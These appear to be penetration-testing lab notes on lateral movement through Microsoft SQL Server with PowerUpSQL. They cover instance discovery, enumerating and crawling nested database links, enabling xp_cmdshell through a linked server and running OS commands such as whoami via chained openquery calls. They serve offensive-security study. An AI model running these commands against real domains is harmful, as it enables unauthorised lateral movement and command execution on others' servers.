- MS SQL servers are generally deployed in plenty in a Windows domain.
- SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.
- For MSSQL and PowerShell hackery, lets use PowerUpSQL https://github.com/NetSPI/PowerUpSQL
- Discovery (SPN Scanning)
```
Get-SQLInstanceDomain
```
- Check Accessibility
```
Get-SQLConnectionTestThreaded

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
- Gather Information
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## Database Links
- A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
- In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.
- Database links work even across forest trusts.
- Searching Database Links
	- Look for links to remote servers
	```
	Get-SQLServerLink -Instance dcorp-mssql -Verbose
	Or
	select * from master..sysservers
	```
- Enumerating Database Links - Manually
```
Openquery() function can be used to run queries on a linked database

select * from openquery("dcorp-sql1",'select * from master..sysservers')
```
- Enumerating Database Links
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose

or

Openquery queries can be chained to access links within links (nested links)

select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')') 
```
- Executing Commands
	- On the target server, either xp_cmdshell should be already enabled; or
	- If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
	```
	EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
	```
	- Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)
	```
	Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" 
	
	Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
	```
	- From the initial SQL server, OS commands can be executed using nested link queries:
	```
	select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
	```
